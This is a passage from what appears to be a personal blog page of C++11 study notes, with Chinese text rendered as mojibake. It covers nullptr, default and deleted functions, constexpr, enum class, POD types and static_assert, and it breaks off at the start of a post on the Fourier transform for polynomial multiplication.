class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">NULL</span>);<span class="comment">//äºŒä¹‰æ€§è­¦å‘Š,ä¸¤ä¸ªé‡è½½å‡½æ•°éƒ½æ˜¯æ¬¡å®Œç¾åŒ¹é…,</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp  -O0 -o main </span><br><span class="line">main.cpp: In <span class="keyword">function</span> <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">main.cpp:57:14: warning: passing NULL to non-pointer argument 1 of <span class="string">&#x27;void func(int)&#x27;</span> [-Wconversion-null]</span><br><span class="line">     func(NULL);</span><br><span class="line">              ^</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">ptr func called</span><br><span class="line">value func called</span><br></pre></td></tr></table></figure>
<h2 id="finalå…³é”®å­—">finalå…³é”®å­—</h2>
<p>finalä¿®é¥°çš„ç±»ä¸å…è®¸è¢«ç»§æ‰¿,ä¸å…è®¸è™šå‡½æ•°é‡è½½</p>
<h2 id="overrideå…³é”®å­—">overrideå…³é”®å­—</h2>
<p>overrideå…³é”®å­—ä¿®é¥°å­ç±»æˆå‘˜å‡½æ•°,ä¿è¯æ˜¯åœ¨é‡å†™çˆ¶ç±»åŒåå‡½æ•°,å¦åˆ™æŠ¥é”™</p>
<h2 id="defaultæ„é€ å‡½æ•°">defaultæ„é€ å‡½æ•°</h2>
<p>åœ¨ä¹‹å‰çš„c++ä¸­,å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ˜¾å¼å†™æ„é€ å‡½æ•°,é‚£ä¹ˆç¼–è¯‘å™¨ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªæ— å‚çš„éšå¼æ„é€ å‡½æ•°,è¿™ä¸ªæ„é€ å‡½æ•°å‡ ä¹å•¥ä¹Ÿä¸å¹²(åœ¨æ±‡ç¼–å±‚é¢ä¸Šä¼šå“¦ç”¨å­ç±»è™šè¡¨è¦†ç›–çˆ¶ç±»è™šè¡¨,ç®—æ˜¯å¹²äº†ç‚¹ä¸œè¥¿,ä½†æ˜¯æºä»£ç å±‚é¢æ— æ³•ä½“ç°)</p>
<p>å‡å¦‚æ˜¾ç¤ºå®šä¹‰äº†ä¸€ä¸ªå¸¦å‚æ•°çš„æ„é€ å‡½æ•°,åˆ™ç¼–è¯‘å™¨ä¸ä¼šå†éšå¼æ·»åŠ æ— å‚æ„é€ å‡½æ•°,è¿™æ—¶å€™å°±ä¸èƒ½æ— å‚æ„é€ äº†</p>
<p>æ¯”å¦‚è¿™æ ·å°±ä¼šæŠ¥ç¼–è¯‘é”™:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Point A;<span class="comment">//å°è¯•è°ƒç”¨ç¼ºçœæˆ–è€…æ— å‚æ„é€ å‡½æ•°å¤±è´¥</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§£å†³æ–¹æ³•æ˜¯å¦å†™ä¸€ä¸ªæ— å‚çš„æ„é€ å‡½æ•°</p>
<p>åœ¨c++11ä¸­çš„è§£å†³æ–¹æ³•æ˜¯<code>Point()=default;</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">Point</span>()=<span class="keyword">default</span>;<span class="comment">//è§£å†³æ–¹æ³•</span></span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Point A;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ„é€ å‡½æ•°ä¸å…è®¸æœ‰å‡½æ•°ä½“,å…¶ä½œç”¨å°±ç›¸å½“äºç¼ºçœæ„é€ å‡½æ•°</p>
<h2 id="deleteå…³é”®å­—">deleteå…³é”®å­—</h2>
<p>ä¹‹å‰åœ¨ä¸€ä¸ªC++ç±»ä¸­,å³ä½¿å•¥å‡½æ•°æ²¡å†™,ç¼–è¯‘å™¨ä¹Ÿä¼šè‡ªåŠ¨ç”Ÿæˆè‡³å°‘ä¿©å‡½æ•°</p>
<p><code>operator=</code>å’Œ<code>copy ctor</code></p>
<p>ç„¶è€Œæˆ‘å°±ä¸æƒ³è®©ä»–ç”Ÿæˆè¿™ä¿©å‡½æ•°,ç¦æ­¢å¯¹è±¡æ‹·è´</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">in <span class="keyword">class</span> <span class="title class_">LinkedNode</span>:</span><br><span class="line">LinkedNode <span class="keyword">operator</span>=(<span class="type">const</span> LinkedNode &amp;)=<span class="keyword">delete</span>;</span><br><span class="line"><span class="built_in">LinkedNode</span>(<span class="type">const</span> LinkedNode&amp;)=<span class="keyword">delete</span>;</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶ä¸»å‡½æ•°ä¸­æƒ³ç”¨ä¸€ä¸ªèŠ‚ç‚¹æ‹·è´å¦ä¸€ä¸ªèŠ‚ç‚¹,ç¼–è¯‘æŠ¥é”™</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221221205948052.png"
alt="image-20221221205948052" />
<figcaption aria-hidden="true">image-20221221205948052</figcaption>
</figure>
<p>å®é™…åº”ç”¨æ¯”å¦‚åœ¨basic_ostreamä¸­,deleteç”¨æ¥ç¦ç”¨å¯¹char8_t*ç±»å‹çš„æµè¾“å‡ºè¿ç®—</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cpp_char8_t <span class="comment">// These deleted overloads are specified in P1423.</span></span></span><br><span class="line"><span class="comment">// don&#x27;t insert a UTF-8 NTBS</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Traits</span>&gt;</span><br><span class="line">basic_ostream&lt;<span class="type">char</span>, _Traits&gt;&amp; <span class="keyword">operator</span>&lt;&lt;(basic_ostream&lt;<span class="type">char</span>, _Traits&gt;&amp;, <span class="type">const</span> <span class="type">char8_t</span>*) = <span class="keyword">delete</span>;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">_Traits</span>&gt;</span><br><span class="line">basic_ostream&lt;<span class="type">wchar_t</span>, _Traits&gt;&amp; <span class="keyword">operator</span>&lt;&lt;(basic_ostream&lt;<span class="type">wchar_t</span>, _Traits&gt;&amp;, <span class="type">const</span> <span class="type">char8_t</span>*) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="explicitå…³é”®å­—">explicitå…³é”®å­—</h2>
<p>explicitä¿®é¥°çš„æ„é€ å‡½æ•°,ä¸å…è®¸å‚æ•°éšå¼ç±»å‹è½¬æ¢</p>
<h2 id="constexprå…³é”®å­—">constexprå…³é”®å­—</h2>
<p>constå’Œconstexprçš„åŒºåˆ«</p>
<p>ä¹‹å‰ä½¿ç”¨çš„conståä¸º"å¸¸é‡"å®é™…ä¸Šæ˜¯"å¸¸å˜é‡"</p>
<p>constä¿®é¥°çš„å˜é‡å’Œæœªç»å…¶ä¿®é¥°çš„å˜é‡åªæœ‰æºä»£ç å±‚é¢çš„çº§åˆ«,æƒ³è¦ä¿®æ”¹constå˜é‡ä¼šè¢«ç¼–è¯‘å™¨å®‰å…¨æ£€æŸ¥é˜»æ­¢.ç„¶è€Œä¸€æ—¦é€šè¿‡äº†ç¼–è¯‘,åˆ°äº†æ±‡ç¼–å±‚é¢,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int a=10</span><br><span class="line">const int b=10</span><br></pre></td></tr></table></figure>
<p>ä¸¤è€…çš„åº•å±‚å­˜å‚¨æ²¡æœ‰ä»»ä½•åŒºåˆ«</p>
<p>åæ±‡ç¼–æ ¹æœ¬çœ‹ä¸å‡ºconstå±æ€§,é¡¶å¤šå¯ä»¥å‘ç°å¯¹båªæœ‰readæ“ä½œ,æ²¡æœ‰ä»»ä½•writeæ“ä½œ</p>
<p>constexpræ˜¯çœŸçš„å¸¸é‡</p>
<p>åœ¨ç¼–è¯‘é˜¶æ®µ,ç¼–è¯‘å™¨æŠŠæ‰€æœ‰èƒ½å¤Ÿè®¡ç®—å¾—å‡ºçš„constexpræ›¿æ¢æˆå­—é¢é‡,constexprä¿®é¥°çš„å‡½æ•°ä¼šç”¨å…¶è¿”å›å€¼å­—é¢é‡æ›¿æ¢å‡½æ•°è°ƒç”¨</p>
<p>å®åœ¨è®¡ç®—ä¸å‡ºæ¥çš„,æ¯”å¦‚éœ€è¦é“¾æ¥å…¶ä»–æ¨¡å—å‡½æ•°æ‰èƒ½ç®—å‡ºæ¥çš„,ç¼–è¯‘å™¨å°±ä¼šå¿½ç•¥constexprä¿®é¥°,è§†ä¸ºæ™®é€šå˜é‡æˆ–è€…å‡½æ•°</p>
<h2 id="enum-class">enum class</h2>
<p>ä¹‹å‰çš„c++ä¸­,æšä¸¾ç±»å‹å®é™…ä¸Šå°±æ˜¯ç»™intç±»å‹èµ·äº†ä¸ªåˆ«å</p>
<p>æ¯”å¦‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span>&#123;</span><br><span class="line">    WHITE,BLACK,RED</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span>&#123;</span><br><span class="line">    SOUTH,NORTH,EAST,WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;WHITE&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;SOUTH&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">if</span>(WHITE==SOUTH)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘é“¾æ¥æ—¶ä¼šè­¦å‘Šä¸åŒç±»çš„æšä¸¾ç›¸æ¯”è¾ƒ</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp -O0 -o main</span><br><span class="line">main.cpp: In <span class="keyword">function</span> <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">main.cpp:14:15: warning: comparison between <span class="string">&#x27;enum Color&#x27;</span> and <span class="string">&#x27;enum Direction&#x27;</span> [-Wenum-compare]</span><br><span class="line">     <span class="keyword">if</span>(WHITE==SOUTH)&#123;</span><br><span class="line">               ^</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">0  0</span><br><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯è¯´ä¸åŒçš„æšä¸¾æ²¡æœ‰ä¸¥æ ¼çš„ç±»å‹åŒºåˆ«</p>
<p>c++11å°±ä¿®æ­£äº†è¿™ä¸€ç‚¹</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Color</span>&#123;</span><br><span class="line">    WHITE,BLACK,RED</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Direction</span>&#123;</span><br><span class="line">    SOUTH,NORTH,EAST,WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;Color::WHITE&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;Direction::SOUTH&lt;&lt;endl;<span class="comment">//ä¸å…è®¸æ‰“å°!&lt;&lt;æ²¡æœ‰é‡è½½Color::WHITEç±»å‹</span></span><br><span class="line">    <span class="keyword">if</span>(Color::WHITE==Direction::SOUTH)&#123;<span class="comment">//ä¸å…è®¸æ¯”è¾ƒ!æ²¡æœ‰é‡è½½==è¿ç®—ç¬¦</span></span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;yes&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="éå—é™è”åˆä½“">éå—é™è”åˆä½“</h2>
<p>æ„Ÿè§‰ç”¨å¤„ä¸æ˜¯å¾ˆå¤§,äº†è§£ä¸€ä¸‹PODç±»å‹å§</p>
<h3 id="podç±»å‹">PODç±»å‹</h3>
<p>Plain Old Data,å¹³å‡¡çš„è€çš„æ•°æ®</p>
<p>Cçš„æ‰€æœ‰æ•°æ®ç±»å‹,åŒ…æ‹¬åŸºæœ¬æ•°æ®ç±»å‹å’Œä»»ä½•ç»“æ„ä½“,éƒ½æ˜¯POD,</p>
<p>å¯ä»¥è¿™æ ·ç†è§£POD:å…¶å†…å­˜å¸ƒå±€æ˜¯å¾ˆè§„åˆ™çš„,ä¸¤ä¸ªåŒç±»çš„PODä¹‹é—´å¯ä»¥ç›´æ¥ç”¨memcpyæ‹·è´æ•°æ®.å•¥æ„æ€å‘¢?</p>
<p>æ¯”å¦‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span>&#123;</span><br><span class="line">	<span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">&#125;Point;</span><br><span class="line">Point A;</span><br><span class="line">Point B;</span><br><span class="line">A.__x=<span class="number">10</span>;</span><br><span class="line">A.__y=<span class="number">20</span>;</span><br><span class="line"><span class="built_in">memcpy</span>(B,A,<span class="built_in">sizeof</span>(B));</span><br><span class="line"><span class="comment">//æ­¤åB.__x=10,B.__y=20</span></span><br></pre></td></tr></table></figure>
<p>Bå’ŒAæ˜¯åŒç±»å‹çš„POD,é‚£ä¹ˆAç›´æ¥æ‹·è´ç»™B,Açš„ç¬¬ä¸€ä¸ªå­—èŠ‚ç»™Bçš„ç¬¬ä¸€ä¸ªå­—èŠ‚,Açš„ç¬¬äºŒä¸ªå­—èŠ‚ç»™Bçš„ç¬¬äºŒä¸ªå­—èŠ‚...æ˜¾ç„¶ç»„è£…èµ·æ¥çš„B,å…¶å‰å››ä¸ªå­—èŠ‚å°±æ˜¯<code>__x</code>,åå››ä¸ªå­—èŠ‚å°±æ˜¯__y`,æ¯‹åº¸ç½®ç–‘çš„</p>
<p>c++11ä¸­å¯ä»¥ä½¿ç”¨<code>std::is_trivial&lt;T&gt;::value</code>æ¥æ£€æŸ¥ä¸€ä¸ªç±»å‹æ˜¯å¦æ˜¯POD</p>
<p>æ¯”å¦‚</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">STRUCTPOINT</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">STRUCTPOINT</span>()=<span class="keyword">default</span>;<span class="comment">//æœ‰ç¼ºçœæ„é€ å‡½æ•°ä»ç„¶æ˜¯POD</span></span><br><span class="line">&#125;Point;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MyPoint</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">MyPoint</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;&#125;<span class="comment">//æœ‰éç¼ºçœæ„é€ å‡½æ•°,ä¸æ˜¯POD</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;is_trivial&lt;Point&gt;::value&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;is_trivial&lt;MyPoint&gt;::value&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\cpp&gt; g++ -std=c+<span class="number">+11</span> main.cpp -O0 -o main</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\cpp&gt; ./main</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸€ä¸ªç±»æœ‰éç¼ºçœæ„é€ å‡½æ•°,æˆ–è€…æœ‰è™šå‡½æ•°,è™šåŸºç±»,æˆ–è€…æˆå‘˜å˜é‡æœ‰ä¸åŒçš„è®¿é—®ä¿®é¥°æˆ–è€…ç¬¬ä¸€ä¸ªæˆå‘˜ä¸æ˜¯è‡ªå·±çš„,æˆ–è€…æœ‰çˆ¶ç±»å¹¶ä¸”çˆ¶ç±»æœ¬ç±»éƒ½æœ‰æˆå‘˜å˜é‡,ä»–å°±æ˜¯éPOD</p>
<p>è¿™ä¸€ç‚¹å¥½ç†è§£</p>
<p>æœ‰è™šå‡½æ•°çš„ç±»,å…¶åŸºåœ°å€å¼€å§‹çš„4ä¸ªå­—èŠ‚æ˜¯è™šè¡¨æŒ‡é’ˆ,ä¸æ˜¯å…¶æˆå‘˜,ä½¿ç”¨memcpyä¹Ÿä¼šæ‹·è´è™šè¡¨æŒ‡é’ˆ</p>
<h2 id="assertion">assertion</h2>
<p>ç¼–è¯‘é˜¶æ®µçš„æ–­è¨€</p>
<p><code>static_assert(bool,string_literal)</code>å¦‚æœå‰é¢çš„boolè¡¨è¾¾å¼ä¸ºçœŸ,åˆ™é€šè¿‡ç¼–è¯‘</p>
<p>å¦åˆ™æŠ¥å‘Šåé¢çš„å­—ç¬¦ä¸²å­—é¢é‡,ç„¶åç»ˆæ­¢ç¼–è¯‘</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">static_assert</span>(<span class="literal">true</span>,<span class="string">&quot;å­—ç¬¦ä¸²å­—é¢é‡&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å¯ä»¥é€šè¿‡ç¼–è¯‘,å•¥ä¹Ÿä¸ä¼šå‘ç”Ÿ</p>
<p>å¦‚æœè¿™æ ·å†™å°±ä¸è®©é€šè¿‡:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20221221214450658.png"
alt="image-20221221214450658" />
<figcaption aria-hidden="true">image-20221221214450658</figcaption>
</figure>
<h2 id="æ­£åˆ™è¡¨è¾¾å¼">æ­£åˆ™è¡¨è¾¾å¼</h2>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/12/19/%E5%82%85%E9%87%8C%E5%8F%B6%E5%8F%98%E6%8D%A2/" class="post-title-link" itemprop="url">å‚…é‡Œå¶å˜æ¢</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-12-19 21:52:00" itemprop="dateCreated datePublished" datetime="2022-12-19T21:52:00+08:00">2022-12-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-09-22 01:59:33" itemprop="dateModified" datetime="2024-09-22T01:59:33+08:00">2024-09-22</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å‚…é‡Œå¶å˜æ¢">å‚…é‡Œå¶å˜æ¢</h1>
<p>ä¸€ä¸ªæ¬ äº†ä¸€å¹´çš„å¸,ä»Šå¤©ç»ˆäºè¿˜ä¸Šäº†</p>
<p><del>æˆ‘æ ¹æœ¬ä¸çŸ¥é“å½•éŸ³çš„åŸºæœ¬åŸç†</del></p>
<h2 id="onlg-nå†…æ±‚è§£å¤šé¡¹å¼ä¹˜æ³•"><span class="math inline">\(O(n\lg
n)\)</span>å†…æ±‚è§£å¤šé¡¹å¼ä¹˜æ³•</h2>
<p>ç®—æ³•å¯¼è®ºä¸Šçš„å‚…é‡Œå¶å˜æ¢,æ˜¯ä¸ºäº†åœ¨<span class="math inline">\(O(n\lg
n)\)</span>æ—¶é—´å†…,è§£å†³å¤šé¡¹å¼ä¹˜æ³•</p>
<p>å¦‚æœç›´æ¥è®©ä¸¤ä¸ªå¤šé¡¹å¼å·ç§¯,é‚£ä¹ˆæœ´ç´ æ–¹æ³•å¤æ‚åº¦æ˜¾ç„¶æ˜¯<span
class="math inline">\(O(n^2)\)</span></p>
<p>å¦‚ä½•é™å¤æ‚åº¦å‘¢?ä½¿ç”¨ç‚¹å€¼è®¡ç®—</p>
<p>çº¿æ€§ä»£æ•°ä¸Šå¯ä»¥è¯æ˜,ä¸€ä¸ªn-1æ¬¡å¤šé¡¹å¼,å¯ä»¥åœ¨å…¶å›¾åƒä¸Šä½¿ç”¨nä¸ªç‚¹å”¯ä¸€ç¡®å®š(æ’å€¼æ–¹æ³•)</p>
<p>ä¹Ÿå°±æ˜¯è¯´,ä¸€ä¸ªå¤šé¡¹å¼<span
class="math inline">\(A(x)=\sum_{j=0}^{n-1}a_jx^j\)</span>å¯ä»¥ç”¨nä¸ªç‚¹è¡¨ç¤º</p>
<p>é‚£ä¹ˆä¸¤ä¸ªå‡ä¸º<span class="math inline">\(n-1\)</span>æ¬¡çš„å¤šé¡¹å¼<span
class="math inline">\(A(x),B(x)\)</span>,å…¶ä¹˜ç§¯å¤šé¡¹å¼å°±å¾—æ˜¯ä¸€ä¸ª<span
class="math inline">\(2n-2\)</span>æ¬¡å¤šé¡¹å¼,éœ€è¦<span
class="math inline">\(2n-2\)</span>ä¸ªç‚¹å”¯ä¸€ç¡®å®š</p>
<p>æ˜¾ç„¶ä»ä¸€ä¸ª<span
class="math inline">\(n-1\)</span>æ¬¡å¤šé¡¹å¼ä¸Šå–n-1ä¸ªç‚¹å·²ç»è¶³å¤Ÿå”¯ä¸€ç¡®å®šè¿™ä¸ªå¤šé¡¹å¼äº†,å†å–å…¶ä»–ç‚¹å°±æ˜¯å†—ä½™ä¿¡æ¯,å¯¹ç¡®å®šè¡¨è¾¾å¼æ²¡æœ‰å½±å“,å› æ­¤å¯ä»¥åœ¨<span
